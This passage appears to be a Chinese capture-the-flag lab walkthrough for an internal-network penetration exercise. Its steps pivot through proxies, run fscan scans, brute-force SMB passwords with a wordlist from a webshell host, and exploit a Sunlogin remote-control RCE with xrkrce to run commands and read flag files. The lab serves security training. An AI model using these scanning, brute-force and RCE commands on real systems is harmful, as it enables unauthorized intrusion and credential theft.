proxychains ssh root@192.168.10.100
```

![image-20221209095432429954-1671607679612100.png](http://192.168.79.239/ct/upload/other/5a2e2490f716683d406fc4d290562c26.png)

执行命令查看flag：

```
cat /root/flag
```

![image-20221208174552985152-1671607681469490.png](http://192.168.79.239/ct/upload/other/ad815d793c542519e826f4ef4392b575.png)

```
flag{D5B4-C84C-688D-AB17-5941-25CB-AA02-C2AF}
```

##### 任务10：资产主机渗透（T1596-主动扫描、T1110-暴力破解、T1022-远程服务）

```
本场景的第10个任务是使用fscan的批量爆破功能爆破网段中用户的密码。

fscan是一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。目标ip可单个可多个，可以是一个网段。

该任务可以通过以下操作完成。
```

`proxifier`工具代理规则中新增目标网段：

```
192.168.100.*;
```

![image-20221206134537283786-1671607683161158.png](http://192.168.79.239/ct/upload/other/cc7b55057955f2773327e801136d0286.png)

本地fscan的命令行中执行命令扫描目标网段：

```
fscan.exe -h 192.168.100.1-254 -p 22,80,3389,8080 -np -t 100
```

![image-20221206135550886295-1671607684939898.png](http://192.168.79.239/ct/upload/other/f8dccb12c354aad7c8d279399e3a2691.png)

在蚁剑`10.10.10.123`主机的`C:/phpStudy/PHPTutorial/Apache/bin/`目录下启动终端，执行命令进行爆破：

```
fscan.exe -h 192.168.100.0/24 -m smb -pwdf top500.txt
```

![image-20221209095758940677-1671607686678641.png](http://192.168.79.239/ct/upload/other/2060986c7b64236950df892988a17952.png)

获取到两台主机的登录信息后远程登录，获取flag：

![image-20221208174954433568-1671607688422172.png](http://192.168.79.239/ct/upload/other/6b82f1fc6a56ff8f34c7f4026c135ac3.png)

```
flag{E0AB-16E5-F7A5-C025-AD58-143D-7AE2-4E71}
```

![image-20221208175050685328-1671607690029821.png](http://192.168.79.239/ct/upload/other/c0f982f0bbb84853769e606ee3b10912.png)

```
flag{26EC-8ABD-D1D8-449D-2C90-64BD-5A2C-88E4}
```

##### 任务11：oa用户渗透（T1596-主动扫描、T1059-命令和脚本解释器、T1202-间接命令执行）

```
本场景的第11个任务是通过远控软件的远程命令执行漏洞获取主机权限。

远程控制软件主要用于pc管理和服务，远控软件是一种在网络上由一台电脑（主控端/客户端）远程控制另一台电脑（被控端Host/服务器端）的应用软件。远控软件一般分为控制端和被控端，办公版是控制端和被控端用同样的程序，可以相互控制。使用时客户端程序向被控端电脑中的服务器端程序发出信号，建立一个特殊的远程服务，然后通过这个远程服务，使用各种远程控制功能发送远程控制命令，控制被控端电脑中的各种应用程序运行，是一个具有强大的内网穿透功能的软件。SunloginClient启动后会在40000以上随机开放一个web端口，但是认证有问题可以直接通过cgi-bin/rpc?action=verify-haras获取cid 执行回显rce。

该任务可以通过以下操作完成。
```

`proxifier`工具代理规则中新增目标网段：

```
192.168.80.*;
```

![image-20221219162125981382-1671607691969942.png](http://192.168.79.239/ct/upload/other/bcb2b26f0a802b955f98f8ef522d4cf9.png)

使用fscan工具进行扫描：

```
fscan.exe -h 192.168.80.1-254 -p 22,80,3389,8080 -t 100 -np
```

![image-20221221144939701335-1671607693701008.png](http://192.168.79.239/ct/upload/other/d570370ce1f3eb58079458e639545791.png)

在蚁剑`10.10.10.123`主机的`C:/phpStudy/PHPTutorial/Apache/bin/`目录下启动终端，探测主机全端口：

```
fscan.exe -h IP -p 1-65535 -np -o result.txt

##-o为将结果输出到文件
```

![image-20221221145436928161-1671607695349926.png](http://192.168.79.239/ct/upload/other/8028a0e5d2c7e7c51dc5e84072b9b3e5.png)

刷新后查看结果文件`result.txt`：

![image-20221206191453632206-1671607697066651.png](http://192.168.79.239/ct/upload/other/9836cd4ded8cafd3ab4aa681b1f2ccd8.png)

![image-20221221145737180359-1671607698766904.png](http://192.168.79.239/ct/upload/other/c85d7fe1f6def3d2362a139432d184e0.png)

进入`C:\Users\Administrator\Desktop\工具\漏洞利用\xrk`目录，将`xrkrce.exe`文件复制粘贴至`192.168.10.101`主机的远程桌面中：

![image-20221208175510433614-1671607700436681.png](http://192.168.79.239/ct/upload/other/ec48014cfebdfcec96ecc62ffd8524f1.png)

桌面目录启动命令行：

![image-20221221151335085137-1671607702386903.png](http://192.168.79.239/ct/upload/other/dbf198d779032e5740bfbabb9507d9a6.png)

执行命令进行扫描：

```
xrkrce.exe -h IP
```

![image-20221221151737842694-1671607704051442.png](http://192.168.79.239/ct/upload/other/af2d67c7d62797139d92877e7d6da16d.png)

获取RCE端口，执行命令进行利用：

```
xrkrce.exe -h IP -t rce -p 端口号 -c "whoami"
```

![image-20221221151958738634-1671607705854683.png](http://192.168.79.239/ct/upload/other/fb05288064ff8d00e32124536614d017.png)

查看flag：

```
xrkrce.exe -h IP -t rce -p 端口号 -c "type C:\Users\Administrator\Desktop\flag.txt"
```

![image-20221221152051816548-1671607707459774.png](http://192.168.79.239/ct/upload/other/ec0fc9bcf88f31cb077b3f06c4392201.png)

```
flag{0713-6EB2-215B-3287-8887-F2BC-7DD8-CCD5}
```

  